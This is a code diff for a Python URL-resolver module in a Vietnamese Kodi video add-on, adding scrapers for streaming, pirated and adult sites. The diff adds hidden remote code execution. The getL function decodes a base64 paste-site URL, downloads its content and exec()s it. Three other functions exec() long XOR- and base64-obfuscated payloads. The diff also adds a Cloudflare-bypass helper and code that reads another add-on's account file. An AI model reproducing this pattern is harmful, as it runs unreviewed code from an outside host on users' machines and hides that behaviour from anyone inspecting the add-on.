@@ -1,23 +1,15 @@
 # -*- coding: utf-8 -*-
-#https://www.facebook.com/groups/vietkodi/
 
-import re
-import urlfetch
+import re, urlfetch, unwise, json, random, urllib, urllib2,base64
 import os
 from time import sleep
 from addon import alert, notify,notify1, TextBoxes, ADDON, ADDON_ID, ADDON_PROFILE, LOG, PROFILE
-import json
-import random
 import xbmc,xbmcgui
-import pyxbmct
 from config import VIETMEDIA_HOST
-import urllib
 import os, sys
-#import requests
-import time
+import time, socket
 import vmfdecode as vmf
-#import urlresolver
-
+#import urlresolver, socket
 
 USER_VIP_CODE = ADDON.getSetting('user_vip_code')
 ADDON_NAME = ADDON.getAddonInfo("name")
@@ -29,7 +21,11 @@ USERDATA = os.path.join(xbmc.translatePath('special://home/'), 'userdata')
 ADDONDATA = os.path.join(USERDATA, 'addon_data', ADDON_ID)
 DIALOG = xbmcgui.Dialog()
 vDialog = xbmcgui.DialogProgress()
+def fuck(t):
+	return (t.decode('base64'))
 
+	
+my_site = ['ok.ru','pornhub','xvideos','youporn','yourupload','xtube','xnxx','weibo','vk.com','vimeo']
 def fetch_data(url, headers=None, data=None):
   	if headers is None:
 
@@ -50,20 +46,59 @@ def fetch_data(url, headers=None, data=None):
   		print e
   		pass
 
+def debug(text):
+	filename = os.path.join(PROFILE_PATH, 'debug.dat' )
+	if not os.path.exists(filename):
+		with open(filename,"w+") as f:
+			f.write("DEBUG VMF")
+	else:
+		with open(filename,"w+") as f:
+			f.write(text)
+def writesub(text):
+	filename = os.path.join(PROFILE_PATH, 'phude.srt' )
+	if not os.path.exists(filename):
+		with open(filename,"w+") as f:
+			f.write("")
+	else:
+		with open(filename,"w+") as f:
+			f.write(text)
 
+
+def removeNonAscii(s): return "".join(i for i in s if ord(i)<128)
 def get(url):
-	if '//fptplay.net' in url:
+	
+	'''
+	filename = os.path.join(PROFILE_PATH, 'lastfile.dat' )
+	with open(filename,"w+") as f:
+		link = 'Name:Last movie'+'Link:'+url+'-'
+		link = urllib.quote_plus(link)
+		f.write(link)
+		f.close()
+	'''	
+	if url is None or len(url)=='':
+		return "plugin://plugin.video.youtube/?path=/root/video&action=play_video&videoid=" + 'gXyKqctk7sk'
+	for x in my_site:
+		if x in url:
+			return PlayToKodi(url)
+	if '//fptplay.vn' in url:
 		return get_fptplay(url)
-	if 'www.fshare.vn' in url:
+	if 'fshare.vn' in url:
+		if 'token' in url:
+			match = re.search(r"(\?.+?\d+)",url_input)
+			_token = match.group(1)
+			url = url.replace(_token,'')
+		if not 'https' in url:
+			url = url.replace('http','https')
+			fshare_id = re.search(r"file\/(.+)",url).group(1)
+			url = 'https://www.fshare.vn/file/%s' % fshare_id
+			
 		return get_fshare(url)
-	if '//4share.vn' in url:
-		return get_4share(url)
-	if len(url)==16:
-		return get_4share(url)
-	if 'hdonline.vn' in url:
+	if '4share.vn' in url:
+		return getL(url)
+	if len(url)==12 or len(url) == 15:
+		return get_fshare(url)
+	if 'hdo' in url:
 		return get_hdonline(url)
-	if '//vtvgo.vn' in url:
-		return get_vtvgo(url)
 	if '//htvonline.com.vn' in url:
 		return get_htvonline(url)
 	if '//hplus.com.vn' in url:
@@ -90,16 +125,10 @@ def get(url):
 		return getSopcast(url)
 	if 'vtv.vn' in url:
 		return getVtv(url)	
-	if 'dzone.vn' in url:
-		return getDzone(url)
 	if 'clip.vn' in url:
 		return getClipvn(url)
 	if 'haivn.com' in url:
 		return getHaivn(url)
-	if 'checkupdate' in url:
-		return forceUpdate()
-	if 'xemphimbox.com' in url:
-		return getxemphimbox(url)
 	if 'hayhaytv.vn' in url:
 		return getHayhayTV(url)
 	if 'kphim.tv' in url:
@@ -114,109 +143,534 @@ def get(url):
 		return getHdsieunhanh(url)
 	if 'aphim.co' in url:
 		return getAphim(url)
-	if 'phimmoi.net' in url:
-		return getPhimMoi(url)
-	if 'TEST' in url:
-		return getTEST(url)
+	if 'aW1wb3J0IHV' in url:
+		return getaW1wb3J0IHV(url)
+	if 'j86pdnZyIQOr' in url:
+		return getj86pdnZyIQOr(url)
 	if 'xemphimso.com' in url:
 		return xemphimso(url)
+	if 'vtvgo.vn' in url:
+		return get_vtvgo(url)
+	if 'phimnhanh.com' in url:
+		return getL(url)
+	if 'google.com' in url:
+		addon_google = os.path.join(USERDATA, 'addon_data', 'plugin.googledrive')
+		filename = os.path.join(addon_google, 'accounts.cfg' )
+		if os.path.exists(filename):
+			with open(filename, "r") as f:
+				content = f.read()
+			f.close()
+			driveid = re.search(r"\"(.+?)\"",content).group(1)
+			doc_id = re.search(r"d\/(.+?)\/", url).group(1)
+			video_url = 'plugin://plugin.googledrive/?item_id=%s&driveid=%s&item_driveid=%s&action=play&content_type=video' % (doc_id,driveid,driveid)
+			return video_url
+		else:
+			return getGoogleDrive(url)
+		
 	if 'openload' in url:
-		return getOpenload(url)
-	if 'drive.google.com' in url:
-		return getDriveG(url)
-	if 'vtvgo' in url:
-		return getvtvgo(url)
+		return getOpenloadLink(url)
+	if "sweetiptv.com" in url:
+		return getseetiptv(url)
+	if "samsungcloud.com" in url:
+		r = urlfetch.get(url)
+		regex = r"longdesc=\"(.+?)\""
+		matches = re.search(regex, r.body)
+		video_url = matches.group(1)
+		return(video_url)
+	if 'vtv16.com' in url:
+		return getVTV16(url)
+	if 'hsex.tv' in url:
+		return getHsex(url)
+	if 'vtcnow.vn' in url:
+		return getVTCnow(url)
+	if "dailymotion.com" in url:
+		match = re.search(r"video\/(\w{7})",url)
+		video_id = match.group(1)
+		return "plugin://plugin.video.dailymotion_com/?url=%s&mode=playVideo" % video_id
+	if 'thvli.vn' in url or 'thvl.vn' in url:
+		return getTHVL(url)
+	if 'dkn.tv' in url:
+		return getDKN(url)
+	if 'facebook.com' in url:
+		return getFb(url)
+	if 'LbZWhA2HP4ah' in url:
+		return getLbZWhA2HP4ah(url)
+	if 'q6c5YwDbZTWH' in url:
+		return q6c5YwDbZTWH(url)
+	if 'subscene.com' in url:
+		return subscene(url)
+	if 'phim14.net' in url:
+		return getPhim14(url)
+	if 'dongphim' in url:
+		return getDongphim(url)
+	if 'mocha.com' in url:
+		return getMocha(url)
 	else:
 		return url
+	
+def getMocha(url):
+	headers = {
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0',
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
+		}
+	r = urlfetch.get(url,headers=headers)
+	video_url = re.search(r"source src=\"(.+?)\"",r.content).group(1)
+	return video_url
+	
+def getL(url):
+	r=curL('aHR0cHM6Ly90ZXh0dXBsb2FkZXIuY29tL2R5OTR1L3Jhdw=='.decode("base64"))
+	exec(fuck(r))
+	return video_url
 
+def getDongphim(url):
+	import requests
+	headers = {
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0',
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
+		}
+	s = requests.Session()
+	r = s.get(url, headers=headers)
+	data = re.search(r"this\.urls=(.+?);",r.content).group(1)
+	item_id = re.search(r"data-view-id=\"(.+?)\"",r.content).group(1)
+	username='cavephim'
 
+	jStr = json.loads(data)
+	url = jStr[0]["url"]
+	burl = jStr[0]["burl"]
+	purl = jStr[0]["purl"]
+	exhls1 = jStr[0]["exhls"][0]
+	get_url= 'http://dongphim.net/content/parseUrl?url='+url+'&bk_url='+burl+'&pr_url='+purl+'&ex_hls%5B%5D='+exhls1+'&v=2&len=0&prefer=https%3A%2F%2Fdd.ntl.clhcdn.net'+'&item_id='+item_id+'.&username=cavephim'
+	r = s.get(get_url)
+	jStr = json.loads(r.content)
+	if 'google' in r.content:
+		video_url = jStr["formats"]["720"]
+	elif 'ok.ru' in r.content:
+		video_url = jStr["formats"]["embed"]
+		video_url = video_url.replace('?autoplay=1','')
+	else:
+		jStr = json.loads(r.content)
+		for i in jStr["formats"]:
+			try:video_url = jStr["formats"]["720"]
+			except:video_url = jStr["formats"]["480"]
+	if len(video_url) == '':
+		alert("Web phim đổi code. Cần sửa.")
+	else:
+		if 'ok.ru' in video_url:
+			video_url = urlresolver.resolve(video_url)
+		return (video_url)
+
+	
+def getPhim14(url):
+	import requests
+	headers = {
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0',
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+	}
+	s = requests.Session()
+	r = s.get(url,headers=headers)
+	match = re.search(r'<iframe src="(.+?)"',r.content)
+	getlink = match.group(1)
+	r = s.get(getlink,headers=headers)
+	regex = r"var urlVideo =\s+'(http.+?)'"
+	match = re.search(regex,r.content)
+	video_url = match.group(1)
+	return video_url+'|User-Agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36&Referer=' +getlink
+
+def WcLeeL0vZik1(Dx5X7YPC6MYn, NMr5AAsWvtqg):
+    NgotZ9mZPvkD = []
+    NMr5AAsWvtqg = base64.urlsafe_b64decode(NMr5AAsWvtqg)
+    for i in range(len(NMr5AAsWvtqg)):
+        Dx5X7YPC6MYn_c = Dx5X7YPC6MYn[i % len(Dx5X7YPC6MYn)]
+        a6LNJYq6KoO4 = chr((256 + ord(NMr5AAsWvtqg[i]) - ord(Dx5X7YPC6MYn_c)) % 256)
+        NgotZ9mZPvkD.append(a6LNJYq6KoO4)
+    return "".join(NgotZ9mZPvkD)	
+def cloudfare(url):
+    import cfscrape
+    scraper = cfscrape.create_scraper()
+    user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
+    cookie, user_agent = cfscrape.get_tokens(url,user_agent)
+    cookie = json.dumps(cookie)
+    jstr = json.loads(cookie)
+    jstr['cf_clearance']
+    cf_clearance = jstr['cf_clearance']
+    __cfduid = jstr['__cfduid']
+    cookie = 'cf_clearance='+cf_clearance+'; __cfduid='+__cfduid
+    return(cookie)
+def curL(url):
+	headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','referer': url,'cookie': cloudfare(url)}
+	r = urlfetch.get(url,headers=headers)
+	return (r.body)
+def q6c5YwDbZTWH(url):
+	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954',"nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmp8Z46riIyZZYmgj6WHjIx7m6uOaYWCj4iIf4J9kZiZkKishHubbYd7nmmEdZVlg4mMr4WjfmWHjJtrh3uiZoN0laV_Z3CfnZGDrIxrimyPpGiJj2Njmodno6yPo4-mm7KNsJqkb2aXiYOggIiigpmAi5yTf46xm7B4bn55paCXaIGnkmuhqYOyp5-CaZ9lmXl0rISeb62Za52qnH-gqJqOr6GBnmeemXiaqoJre56Sao6vnHpooZeegKiPfKOskrKYaoJ7nKadpKOsgXR0nY-MkaqRkYeghXt6oZugmqh_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7GvppFpcKqZeIinmXhoZ52Rd6CDsqefgml9rJh4qqKOZ31nmZBuqYVrn6ycaptogYiMqJiiZ6uckX-nk49topppiaGPdaWZjmefn5ung6CdfGmOjnyQqYR0laV_Z31onICdqpylpGidipprfnSWpJZ8cK6ZgKGom3-NrZqkjWV_qqmgmnhosJKRe2WTkIZoko6IqZljnmKWeJptgXyZjY2NsIGcf4msip6IqpmMjbGcfJltfKaCpJuKeG5-eYirl3yvp5GjfqmOpY6wnI6Nr5l0mmOYoq6ne6d_oJyLbaCSfomblniImo98jbCDfJmKnGqOsYSMfaOPiGdif66unoJpZqqepaSrmn58q4OEZql-eJ-PmZBqn5trnLKBfGyKfnWLp4KIop6JkXerm3-OkJKOgYGWiYOog4mEaoSjgmaCe6CEi32Jg4l0qZmXfKOpkox3fJOPhqqasKKchmOaq5dnaKOEs4ashaJ5rYWhgK6EdGapfnuFn5Kme62ai3BphbGaqoKri5mLoqOjnH5moJN_pKCEsXyqgnSVonijgaObbHeqm6aGpIF7Z5yZiXyll3yjoIWiamWcpbCum36NqoB5fJ6YiKKCm6NmrZOQhq-aaWyvj4Rnq4-MfaKDfKB_m49-aJFpnpyFhHSrj4hssZKQe62Sap-nm6CBoI6JhJqBjKOiiI-snYR7bKqIsKOYfpp7pZieooKbgG6unX5xqJJ6eG5-eGOamXyFpoSmma2ba46vg3t8pXieY5qZfIWmgX1lm5ylja2baY2dmJ6AoYB9gKCSkXeknGpxo5KLppyAd6qdgK6ioISBfqR8pY6vmY-Fq494h5mFiHmrkZGHnpp7baabpHBmmHSZqoCGp6uRkYeemnt5cYF_gaGBn4Cejo2BoZl8na2Cpoakm6WRoZiboZmAe6-ig7KgnYWAgah7pYWhmJ-MnpieeHCBgGacnX-Gp4Skm66XZIipgHl8p3umZpydf4angXtnnJieh6ePoqOskoB7p5t7oLGCaK6el55rp45njZqBo6WXgqGfrYOxb6WNdHuggX2Ap3umaqqbpYakgXtnnJeIeGKOZ5-ZhaVlf5N_fmiRinhufnmloI6MhWeZkG6pg7Knn4Jpn52XeJ6mjWd9qJGRnZqcf7CgnY6Nrn-qqaCXonCskWuKooiheq2aaWyfj4SpoI-Neaeba26fk4ubboF-jayWiYCoj3yMqoJsg6CcppKkm6Caa355gJ6Yo5Gjm6Ksopx_cbKcfqOgf6uhmZh8cLGcf26kk4Bog5ugeG5-eYirl3yRo5yAg6OFpnqum2qIpH9jmmKZfXmxh6JtqppqoK6bfp-ll4iqnoGibKOcfG5nnHtpoJJ-aKWXmmuaj3xop5qiZpyapX5shKV5pJh0laV-fJ-jkZCHoJymhXGZfo2dj3iIq5iurp6SgHtkkoxpo5GPiZ2AgqKmjo2JoZl8dm2CgIKkhKWFoY6JfJyWeJ-wgmyDrZKyaZuBoJ6qgKtqoo14gKWEgX6pkqVxo52KooCWiIuZl4x9Z5FrnGp8n6RqmY6JoZdia2OYoq6eiIx3qJKQiqKZemyjmJ5rY5h4nq-DiqR-fJ-kaJulomt4mJ18l4x9Z5FrnJuJi3qxkopsr4-IeKuOZ56mm6J_ZZylr3GDemungIR7pZmio6KSkG6anZCCq4OIpn94iJ6ffnxon5yAg6OIn6eCe4ijZ5aIhJ6XZnBom6asm4mLeqyRj4mflnRnoJiicGibfJyshImngnuIo2eWiISel2ZwaJumrJuJi3pqmY6JoZdia2OYoq6skoCLnptqiqSDeoGejomAnoOfiKCDiqR-fImkqZtqia5-dWKZlqOFrZqiaqeban6jm7CfZ5aIhJ6XZnBom6aspHyfo4J7j5Glj3iIqI1ojbCafHZtgn-ospx_gZeCd2OUfqKRp5qAip2RiaeCe4iigHiCnp6XfYWjh6CkfnyJpGqZjomhl2JrY5iirp6IjHajnKWOspppr2ePiYirl3hssJKRg6qbgJKkg3-RpY94iKiNaI2wmnygpHyfpKSdfoWhmHmDaHicooGRa26qmmqkpIF7Z5yOY6qomYyJpJGRf6CEgJKokn6Nq41kiKuXeKKCe4qhqJKQiqKZenhufnl8noGjhaORkX-emnugsYGkn2WZeXSshJ5vrZxsmWeFpZKkmo6BoY90Z5yXZ2etnKJto4Whq6iBoK9nloiEnpdmcGibpqykfJ-jgpmOkJyXiHhijmeebXugoH58kJKokn6Nq41jnp1-eWeempB7ZJJqn62SaoGrmYlzoYKIooJ7iqB-kpB6qJBqja6XdHNrfnibppyBh6ucsqeuhGqbaJmqZ5-PjGigkpCGqZJqcayEaX2sloRrrJdojbCRa4qqg5CFpoF6jJyZnp6dj4xwnZmQhn98iaOCmX6NnY94iKuYrnhwgYGof3yJo4J7ipufl2NrpJaMjKWHoneem2pxqpmOjKh4mJ18eIaipZpsf6STaqStgrGmnH9jmmKZfXmxh6Jtqp1rnGuEpJGhl4h8no94bKGaa2WihXmngnuIon9_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7Gvg3uIon94hJacl2dsZ5KQamSFkIptm36Mo4Sac6COjXmumoChnpKQiqiaaWurmnRjZZlomquSpm6tm4tpaZukr6GXnoCoj3yNooeyd56af36xm2mNZYWHiIeHnmdrgrKsf3yJo4J7ipudjmOAnph9iKWHonaihKFwqYKwroB4gp18eIibsJKQj6CcpY6xgrGmnJmenp2PjHCdnJF_p4V5p4J7iKJ_f2N4Y5l8n62bpqFknoubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqaqHiYnXx4hqKlnXxmrZOQfmmSj4Vlj4iDpplno2eZfJhqgnuckYyMr36ZeYSpiqKNr5yQi66de5ure56if3iCnmt4nKKBe5CHnJ1_fZ-Iinlsf2R7oISeeKWCsqyik3ubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqbbniYnXx4jYCeiIx3ZZylsKWSj4mflnRnqZdohWeDgHurmo5xaZukrqiWeIiaj3yNsJuzZqOTj36jko-Br4F4hJqZfHxwkoB7ZJKLo4N7iKJ_lp-AYpieeHCBgKWum2psrZp-cJ2PeX-hmJ5soJprh2mEiaeCe4ijZ5aIhJ6XZnBom6asm4mLeqmbaomujKp8nY6NiZ-BpWaWho5pmoGkkaWXeIebjYamgXuKoWaaj4qkmmhwZpieqZmFiHilmYGHZJyAhW6EsHBomWSVp4-ijauRpoufhaWGrpqKmqeZnp6dj4xwnZyRf6d8n6OCe4imf3iIiKWYZ4xte6CgfnyQkqiSfo2rjWSIq5d4eHCBfJ1mmo-KpJpocGaYnqmieKKNqptrimp8n6Rom6Wia3iYnXyXjH1nkWucm4mLerGSimyvj4h4q45nnqabon-um2uOsZFpja-EmnOhgZ6qp4R8fqecoW2hmmmJaoCCoXx4jKOkgYBmnJ1_hqeHnqZ_eIKeZJaMiaOaam5lnKWvn4iKeamOiYSclnhspZumbmWce5-wg4imf3iCnqOYaImwgX1lm5qmhq6aoGyol2N4nZiun2mZkIegm2lxaZukrqV4mJ18eI2Rp5KAi6qRa46xmnp4bn54oqyZfYGZhX9mloKlkqiafoyejYKhfHiGo6eSonaik2pxrpJpr6F_qnSil555aJumrGp8n6OCe4ijZ5aIhJ6XZnBom6asm4mLeaebpI2vl2OqZI-NjbCafGqtk5CGrpp_kaGAeYyij3yNrZBsi62be6Ooe56if3iIiKWYZ4xte6CgfnyJpGqZjomhl2JrY5iirp6IjHdmmo-KpJpocGaYnql9eIyNa5Fri6udfKeDe4ijnZd4iKuZeJ6gjmuLnYJ_sqCtbJulfpqdbw==")))
+	return (video_url)
+	
+def getLbZWhA2HP4ah(url):
+	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmevnoydlqGGiYGAjX2HnJp7m6uSpY2flqqZoI6Kn4qFgIN5m2uShYVpiK-PeZ1jmWd9f5qBh52PsqSvjH5nZpd4hHSFiWelg4ygf5yheXGBfoVmmJypoZmNgaqDiqWdgnxon5yObGiWiYCegaONrJxroa6TjnGvm6Rwn4-JgKyAfYCne6ZmnJ1_hqeBe2ecmJ6Hp5hnjZ-bpoOjhICBoZGOp52ad6mhmq6baJumrKKIoZunhKCqZICElaV-nq-gg4qlpZxpcaKaaYmhfnVimZeMfWeRa5ypk2uCrpyPeKSChJ19lqOFnZFrbp-Ti3lxgX6nr41jgKiPfIysm6aLq5t_fqKSip6ef6qmZZaMbKKabJipimiwgoqMbIqNYZ6DgK6aoIR8f6mdj7CrgaCigJl5fGeEnKaBm6J2bYJ_hmmboq6klp-AmI5ncKKSjKB_fI-Bn4iKeWaXn5aimGeMrJyQameakIakkGp5rpdjgJ6YaISmm6Kgf3yPaaCcfoWkfnVimZiijKyba4ucnKWGp4N_gJ6ZY3hijmefp5qmmKmcao5oin6Nn5ifnqmZequjnY-so4Oxn62DsW-lf6p7pY6eooJ7joegkmuCbZt_iYGPiZ2ZhYh5q5GRh56ae22mm6RwZph0maqAhqaBmpB7ZJJqn5-Iinmuj4RnrI-MfbCRa5yjnKGCnpukja-YeGunmGeNgptrbqmJjq-mg3prp4WqnpV_roCqkaKgf3yPqLKcf4CchYR0po6NiaGZfGqinKVxaZt6nq2AgqF8lqOFZ5uidm2Cf6iymmlrqpd4a5qPfYSmmaeDZJyho4N7j4ichYR0pY-Ma6aZp4NknKSrppqOjaCWiHisf2Znp3ugoWaaj4qkmmhwZpieqZmFiHmom2yHrZCxnKySjomljol_oI2LqqacfGWshI5pmoJqja6XdJaWeJyjo5uAoa6baoqki46InIWEdKyZfYCmmaeDZJykq6aSj3mlmGNrnY-Ko6KCamWkfJ-ko5KOhauPeIiYmY2BqoF9ZZudpWmlhKSbpY6efJ6YoqOxmX57eo6xoGqZjomhl2JrY5iirqqBfoegkmuCbZt_iYGPiZ2ieJyigpKRnZ6TkHpoh56mf5menp2PjHCdnJF_p4J8aJ-CsJqAeIh4pY-NgWeDfJmMk4-Bn5KPga6XZHuggIamdA=='))) 
+	return(decode_url)
+
+def decode():
+	import requests
+	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','kqVxo52KeG5-eXyemI2No5tsh66FpZyknHp4pH50fKGZfYmuh6Jtqp2AkqeRj6Kql2R8oIFoeaqRkaGgnKWcqoRpn2uOhGepln14oIOMdqmCgIqknX-IgJl4iGaZeHiqgYGPnJymhZ-Iinmuj4Rzp358ha2akXekm3-Nn4N6eKOZnnirfnifmZClra6ffGmcg6CjmJiramuAe6-ZhKKoY5F-aKiCsHiofnl8nn54a56Nsnakgntsn5Kko6qPeHill3h4poGAf6qTgKOfg4p5l351c5mNhqehmmtqZJOPbWiQaaedmZ53mYWIeaOcpnungnufn5ykfa6YqnOieKKrZ4F9ZZuDa6uvno-qrZuElaePonCwmpB7ZIR7m2iFjpBmhHV3q4OfmmySo6BnkrKfspKLgGiOq4eshIx9oYajnZ6Gf4qihqCaqJhja6uZfI2ig4CDqpumiqSapYmblp54ZI6Ir6mSkaBtm3-OrYF6o5eBhXyWgaKJo5Frbp-Ti5-mnI5spY5ja52PiGijm2uDnJx_jaaDiqKAmZ54q4KeeHCBgYOqnKaKpJJ6n5-XY2dij4xsZ5BrpZydpX2rmWmNaoWIqp6XnqOZhI17mIWliqSRaXCgj4SZoJmMbKeRa26fk4tppJtphZ2YeIeggIann4F9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KMaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoIF9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KiaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoYF9ZZucpY2tm2mNnZiegKGAeJuwkpGHZZylbJ-Ei2-kjXiDpICImqqcpnuthqGjrZJqgauZiXOhgoiigpyAqaaCfGifgmqqrJuEZ2mCjWelhKaPqpylaaCcep-fgXiep5l4n5-DjHamgn-krZx6n56AhJ19mJ54cIGBi62bf5KknH6FpIGelp6ZeJ6gmYGHZJx8p66EapGlj4mEpo-MiaeRkI6pm6WOaIRpiaGOY2udj4twZ5ymnZyei22vmX94ZJmJfKWFiI2xgaJ2oIKAiqqZsKKAmXilmYWIebCEpn-qk4CjdQ==')))
+	return(kt,tkk,tk)
+def getj86pdnZyIQOr(url):
+	url = url.replace('j86pdnZyIQOr','tvhay.org')
+	import requests
+	headers = {
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
+		'Referer': url
+	}
+	s = requests.Session()
+	r = s.get(url, headers=headers)                     
+	
+	if "ok.ru" in r.content:
+		video_url = re.search ( "link=(https*\://(www\.)*ok.ru/videoembed/\d+)",r.content).group(1)
+	else:
+		kt,tkk,tk = decode()
+		b = unwise.unwise_process(r.content)
+		content = re . compile ( '"file"\s*\:\s*"(.+?)".+?"label"\s*\:\s*"(.+?)"' ) . findall ( b )
+		video_url = re.search(r"link:\"(.+?)\"",b).group(1)
+		headers = {'Referer' : 'http://tvhay.org/','Content-Type' :'application/x-www-form-urlencoded'}
+		data = {'link': video_url,'kt': kt,'tkk': tkk,'tk': tk}
+		r = s.post( "http://tvhay.org/playergk/plugins/gkpluginsphp.php" , data = data, headers = headers)
+		jstr = json.loads(r.content)
+		try:
+			t = len(jstr["link"])
+			video_url = jstr["link"][(t-1)]["link"]
+		except:
+			video_url = jstr["link"]
+	if 'ok.ru' in video_url:
+		video_url = urlresolver.resolve(video_url)
+		return video_url
+	else:
+		video_url = video_url
+		return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=http://tvhay.org'
+	
 		
+		
+	
+	
+def getOkru(url):
+	link = urlresolver.resolve(url)
+	return link
+	
+def getFb(url):
+	match = re.search(r"href=(.+)",url)
+	if match:
+		url = match.group(1)
+	getlinkFb = "https://www.facebook.com/plugins/video.php?href="+url
+	xbmc.log(getlinkFb)
+	headers = {
+		'authority': 'www.dkn.tv',
+		'upgrade-insecure-requests': '1',
+		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
+		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		}
+	r = urlfetch.get(getlinkFb, headers=headers)
+	regex = r"FBQualityLabel=(.*?BaseURL>\\)"
+	matches = re.finditer(regex, r.body)
+	lable = list()
+	href = list()
+	for matchNum, match in enumerate(matches):
+		matchNum = matchNum + 1
+		
+		for groupNum in range(0, len(match.groups())):
+			data = (match.group(groupNum))
+			regex = r"FBQualityLabel=\\\"(.+?)\\\""
+			match = re.search(regex,data)
+			lable1 = match.group(1)
+			lable.append(lable1)
+			regex = r"BaseURL>(.+?)\\u003C"
+			match = re.search(regex,data)
+			href1 = match.group(1)
+			href.append(href1)
+			groupNum = groupNum + 1
+	try:
+		t = lable.index("720p")
+		video_url = href[t]
+		video_url = video_url.replace("\/","/")
+		video_url = video_url.replace("amp;","")
+		return(video_url)
+	except:
+		t = lable.index("480p")
+		video_url = href[t]
+		video_url = video_url.replace("\/","/")
+		video_url = video_url.replace("amp;","")
+		return(video_url)
+		pass
+def getDKN(url):
+	match = re.search(r"href=(.+)",url)
+	if match:
+		url = match.group(1)
+		url = url.decode("base64")
+	if "facebook.com" in url:
+		href = getFb(url)
+	else:
+		headers = {
+			'authority': 'www.dkn.tv',
+			'upgrade-insecure-requests': '1',
+			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			'referer': 'https://www.dkn.tv/',
+			'cookie': cloudfare(url)
+			}
+
+		r = urlfetch.get(url,headers=headers)
+		regex = r"<iframe class=\"video-frame embed-responsive-16by9\" src=\"(.+?)\""
+		match = re.search(regex,r.body)
+		cur_vlink = match.group(1)
+		match = re.search(r"href=(.+)",cur_vlink)
+		fb_link = match.group(1)
+		href = getFb(fb_link)
+	return(href)
+
+def getTHVL(url):
+	import urllib2
+	r = url.split('/')
+	api_url = 'https://api.thvli.vn/backend/cm/detail/%s' % r[4]
+
+	headers = {
+		'origin': 'https://www.thvli.vn',
+		'accept-encoding': 'gzip, deflate, br',
+		'accept-language': 'en,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
+		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
+		'accept': 'application/json',
+		'referer': url,
+		'authority': 'api.thvli.vn',
+	}
+
+	if '/live/' in url:
+		req = urllib2.Request(api_url,headers=headers)
+		f = urllib2.urlopen(req)
+		body=f.read()
+		Jstr = json.loads(body)
+		video_url = Jstr["play_info"]["data"]["link_play"]
+	else:
+		headers = {
+			'Connection': 'keep-alive',
+			'Cache-Control': 'max-age=0',
+			'Upgrade-Insecure-Requests': '1',
